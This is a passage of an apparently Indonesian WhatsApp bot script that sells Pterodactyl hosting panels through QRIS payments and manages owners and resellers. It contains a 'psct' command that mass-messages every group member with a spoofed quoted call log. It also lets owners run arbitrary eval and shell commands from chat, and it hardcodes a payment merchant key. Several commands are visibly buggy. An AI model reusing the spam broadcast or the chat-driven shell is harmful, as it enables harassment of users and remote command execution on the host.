"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": -1,
"disk": disk,
"io": 10,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ReplyX(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await ReplyX(`
Successfully Added User + Server To Database Panel!
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  ReplyX('Error\n Invalid PTLA / PTLC. Silahkan cek kembali')
}
}
break
case "buypanel": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
let teks = `
*Silahkan Pilih RAM Server yang tersedia*
 
* 1GB
* 2GB
* 3GB
* 4GB
* 5GB
* 6GB
* 7GB
* 8GB
* 10GB
* unlimited

 Cara penggunaan : *.buypanel* 8gb
`
if (!text) return m.reply(teks)
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb") {
Obj.ram = "1000"
Obj.disk = "1000"
Obj.cpu = "40"
Obj.harga = "1000"
} else if (cmd == "2gb") {
Obj.ram = "2000"
Obj.disk = "1000"
Obj.cpu = "60"
Obj.harga = "2000"
} else if (cmd == "3gb") {
Obj.ram = "3000"
Obj.disk = "2000"
Obj.cpu = "80"
Obj.harga = "3000"
} else if (cmd == "4gb") {
Obj.ram = "4000"
Obj.disk = "2000"
Obj.cpu = "100"
Obj.harga = "4000"
} else if (cmd == "5gb") {
Obj.ram = "5000"
Obj.disk = "3000"
Obj.cpu = "120"
Obj.harga = "5000"
} else if (cmd == "6gb") {
Obj.ram = "6000"
Obj.disk = "3000"
Obj.cpu = "140"
Obj.harga = "6000"
} else if (cmd == "7gb") {
Obj.ram = "7000"
Obj.disk = "4000"
Obj.cpu = "160"
Obj.harga = "7000"
} else if (cmd == "8gb") {
Obj.ram = "8000"
Obj.disk = "4000"
Obj.cpu = "180"
Obj.harga = "8000"
} else if (cmd == "9gb") {
Obj.ram = "9000"
Obj.disk = "5000"
Obj.cpu = "200"
Obj.harga = "9000"
} else if (cmd == "10gb") {
Obj.ram = "10000"
Obj.disk = "5000"
Obj.cpu = "220"
Obj.harga = "10000"
} else if (cmd == "unli" || cmd == "unlimited") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "11000"
} else return m.reply(teks)

const UrlQr = `00020101021126670016COM.NOBUBANK.WWW01189360050300000879140214621103778158240303UMI51440014ID.CO.QRIS.WWW0215ID20243511142180303UMI5204541153033605802ID5920SKYZOPEDIA OK20882436009SIJUNJUNG61052751162070703A0163042A2F`

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

let amount = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://gateway.elevate.web.id/api/orkut/createpayment?amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*▧ INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await xin.sendMessage(m.chat, {image: {url: get.data.result.qrImageUrl}, caption: teks3}, {quoted: m})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await xin.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await xin.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(15000)
const resultcek = await axios.get("https://gateway.elevate.web.id/api/orkut/cekstatus?merchant=OK2088243&keyorkut=846854217289281822088243OKCTF5EC133AC4A0C62E4E29B23C43291972")
const req = await resultcek.data.amount
if (db.users[m.sender].saweria && req == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await xin.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Panel Pterodactyl
 *• Payment :* ${resultcek.data.brand_name}
`}, {quoted: db.users[m.sender].saweria.msg})
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}
* *Ram :* ${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0,2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}
* *Cpu :* ${Obj.cpu == "0" ? "Unlimited" : Obj.cpu+"%"}
* *Disk :* ${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0,2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await xin.sendMessage(orang, {text: tekspanel}, {quoted: null})
await xin.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case "batalbeli": {
if (m.isGroup) return
if (db.users[m.sender].status_deposit == false) return 
db.users[m.sender].status_deposit = false
if ('saweria' in db.users[m.sender]) {
await xin.sendMessage(m.chat, {text: "Berhasil membatalkan pembelian ✅"}, {quoted: db.users[m.sender].saweria.msg})
await xin.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key })
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
} else {
await m.reply("Berhasil membatalkan pembelian ✅")
}
}
break

case "1gb2": case "2gb2": case "3gb2": case "4gb2": case "5gb2": case "6gb2": case "7gb2": case "8gb2": case "9gb2": case "10gb2": case "unli2": {
if (!isPrem && !isReseller) return ReplyX(`Fitur Ini Khusus Premium & Reseller`)
if (!text) return m.reply("Mana Usernamenya?")
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb2") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb2") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb2") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb2") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb2") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb2") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb2") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb2") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb2") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username + "xinner@id"
let name = username
let password = username + "1717"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain2 + `/api/application/nests/5/eggs/` + egg2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var cihuy = `
Paket Anda Telah Datang 📦
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain2}

*Rules & Catatan Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 20 Hari (2x replace)
* Buyer TIDAK Boleh Memasang Script DDos Pada Panel
* Jika Password Salah Maka Ganti 001 menjadi 100800 
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
============== © Xin ==============
`
await xin.sendMessage(u, { caption: cihuy, image: P1, quoted: qpayment });
delete global.panel
}
break
case "listadmin-v2": {
if (!isOwner) return ReplyX("Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin . . .")
let cek = await fetch(domain2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *#- List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await xin.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

case "listserver-v2": {
if (!isOwner) return ReplyX("Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin")
let f = await fetch(domain2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *#- List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await xin.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

//================================================================================

case "deladmin-v2": {
if (!isOwner) return ReplyX("Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin")
if (!text) return ReplyX("Mana Id Panelnya?")
let cek = await fetch(domain2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${getid}*`)
}
break

//================================================================================

case "delpanel-v2": {
if (!isOwner && !isPrem) return ReplyX("Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin")
if (!text) return ReplyX("Mana Id Panelnya?")
let f = await fetch(domain2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${nameSrv}*`)
}
break
case "delowner": case "delown": {
if (!isOwner) return ReplyX("Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin")
if (!m.quoted && !text) return ReplyX("Mana Nomornya?")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./gudang/database/own.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break

//================================================================================

case "addowner": case "addown": {
if (!isOwner) return ReplyX("Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin")
if (!m.quoted && !text) return ReplyX("Mana Nomornya?")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./gudang/database/own.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break
	case 'addprem': {
if (!isOwner) return ReplyX(mess.only.owner)
if (!args[0]) return ReplyX(`Use .addprem number\nExample .addprem 6281111111111`)
prembase = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let numero = await xin.onWhatsApp(prembase)
if (numero.length == 0) return ReplyX(`Enter a valid and registered number on WhatsApp!!!`)
prem.push(prembase)
fs.writeFileSync('./gudang/database/prem.json', JSON.stringify(prem))
ReplyX(`The Number ${prembase} Has Been Added To Our Database System!`)
}
break
case "delprem": {
if (!isOwner) return ReplyX("Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin")
if (!m.quoted && !text) return ReplyX("Usage:\n.delprem 62xx")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus premium owner!`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan user premium!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./gudang/database/prem.json", JSON.stringify(premium, null, 2))
m.reply(`Sukses Delpremium 🥳`)
}
break
	case 'addresellerpanel': {
if (!isOwner) return ReplyX("Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin")
if (!args[0]) return ReplyX(`Use ${prefix+command} number\nExample .addresellerpanel 6281111111111`)
sellbase = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let sellnumero = await xin.onWhatsApp(sellbase)
if (sellnumero.length == 0) return ReplyX(`Enter a valid and registered number on WhatsApp!!!`)
reseller.push(sellbase)
fs.writeFileSync('./gudang/database/reseller.json', JSON.stringify(reseller))
ReplyX(`The Number ${sellbase} Has Been Added To Our Reselling Database System!`)
}
break
case "delresellerpanel": {
if (!isOwner) return ReplyX("Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin")
if (!m.quoted && !text) return ReplyX("Usage:\n .delresellerpanel 62xx")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus role owner!`)
if (!reseller.includes(input)) return m.reply(`Nomor ${input2} bukan reseller panel`)
let posi = reseller.indexOf(input)
await reseller.splice(posi, 1)
await fs.writeFileSync("./gudang/database/reseller.json", JSON.stringify(reseller, null, 2))
m.reply(`Sukses Delete Reseller Panel 🥳`)
}
break
case "listresellerpanel": {
if (reseller.length < 1) return m.reply("Tidak ada user premium")
let teks = `\n *#- List all reseller panel*\n`
for (let i of reseller) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
xin.sendMessage(m.chat, {text: teks, mentions: reseller}, {quoted: qpayment})
}
break
	case 'addresellersubdo': {
if (!isOwner) return ReplyX("Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin")
if (!args[0]) return ReplyX(`Use ${prefix+command} number\nExample .addresellersubdo 6281111111111`)
subdobase = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let xnum = await xin.onWhatsApp(subdobase)
if (xnum.length == 0) return ReplyX(`Enter a valid and registered number on WhatsApp!!!`)
reseller.push(sellbase)
fs.writeFileSync('./gudang/database/resellersubdo.json', JSON.stringify(resdo))
ReplyX(`The Number ${sellbase} Has Been Added To Our Reselling Database System!`)
}
break
case "delresellersubdo": {
if (!isOwner) return ReplyX("Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin")
if (!m.quoted && !text) return ReplyX("Usage:\n .delresellersubdo 62xx")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus role owner!`)
if (!resdo.includes(input)) return m.reply(`Nomor ${input2} bukan reseller subdomain`)
let posi = resdo.indexOf(input)
await resdo.splice(posi, 1)
await fs.writeFileSync("./gudang/database/resellersubdo.json", JSON.stringify(resdo, null, 2))
m.reply(`Sukses Delete Reseller Subdomain 🥳`)
}
break
case "listresellersubdo": {
if (resdo.ength < 1) return m.reply("Tidak ada reseller subdomain")
let teks = `\n *#- List all reseller subdomain*\n`
for (let i of resdo) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
xin.sendMessage(m.chat, {text: teks, mentions: reseller}, {quoted: qpayment})
}
break
case "listpremium": case "listprem": {
if (premium.length < 1) return m.reply("Tidak ada user premium")
let teks = `\n *#- List all user premium*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
xin.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

            case "cekjid": {
                if (!isOwner) return
                ReplyX(`${m.chat}`);
            }
            break
           
            case "psct": {
                if (!isOwner) return //😹
                let [jidsny, teks] = q.split("|");
                let metadata2 = await xin.groupMetadata(jidsny);
                let colls = metadata2.participants;
            
                for (let mem of colls) {
                    let jidd = mem.id.split('@')[0] + "@s.whatsapp.net";
            
                    try {
                        await xin.relayMessage(jidd, {
                            extendedTextMessage: {
                                text: teks,
                                contextInfo: {
                                    remoteJid: "status@broadcast",
                                    participant: "0@s.whatsapp.net",
                                    quotedMessage: {
                                        callLogMesssage: {
                                            isVideo: true,
                                            callOutcome: "1",
                                            durationSecs: "0",
                                            callType: "REGULAR",
                                            participants: [{ jid: "0@s.whatsapp.net", callOutcome: "1" }]
                                        }
                                    }
                                }
                            }
                        }, { participant: { jid: jidd } });
            
                        await sleep(500);
            
                        await xin.relayMessage(jidd, {
                            stickerMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.15575-24/19454052_887239376370707_1335161085331526466_n.enc?ccb=11-4&oh=01_Q5AaIJLMvNTGsNlqqBNxaXGwXB7TaTNt98CU_hYSDhXNUNUL&oe=6735FC8B&_nc_sid=5e03e0&mms3=true",
                                fileSha256: "zNeoLRpsgYs7zOkmw9hJ3YCdiQmv43cXzxHOFoLG8Ho=",
                                fileEncSha256: "/jzkyt6lleSFF4RYV/1tb7mkmaErv1fsLqKiFizdsZg=",
                                mediaKey: "sPvNxA5VWzrCX9qR4Q9FPjmpAHs22jd2D+LBC1OB0a8=",
                                mimetype: "image/webp",
                                height: 64,
                                width: 64,
                                directPath: "/v/t62.15575-24/19454052_887239376370707_1335161085331526466_n.enc?ccb=11-4&oh=01_Q5AaIJLMvNTGsNlqqBNxaXGwXB7TaTNt98CU_hYSDhXNUNUL&oe=6735FC8B&_nc_sid=5e03e0",
                                fileLength: "29528",
                                mediaKeyTimestamp: "1729000225",
                                isAnimated: false,
                                stickerSentTs: "1729000225485",
                                isAvatar: false,
                                isAiSticker: false,
                                isLottie: false
                            }
                        }, { participant: { jid: jidd } });
            
                        await sleep(1000);
                    } catch (error) {
                        console.error(`Error sending `, error);
                    }
                }
                await ReplyX("*Sukses Cak ✅*")
            }
            break


			default:
			if (body.startsWith("<")) {
                if (!isOwner) return;
                try {
                    const output = await eval(`(async () => ${q})()`);
                    await m.reply(`${typeof output === 'string' ? output : JSON.stringify(output, null, 4)}`);
                } catch (e) {
                    await m.reply(`Error: ${String(e)}`);
                }
            }
			if (budy.startsWith(">")) {
			if (!isOwner) return
				try {
					let evaled = await eval(q);
					if (typeof evaled !== "string") evaled = util.inspect(evaled);
					await m.reply(evaled);
				} catch (e) {
					await m.reply(`Error: ${String(e)}`);
				}
			}
			if (budy.startsWith("$")) {
			if (!isOwner) return
				exec(q,
					(err, stdout) => {
						if (err) return m.reply(err.toString());
						if (stdout) return m.reply(stdout.toString());
				})
				}
		}
		
	} catch (e) {
		console.log(e)
	}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(`File Updates Detected\n Update ${__filename}`)
	delete require.cache[file]
	require(file)
})
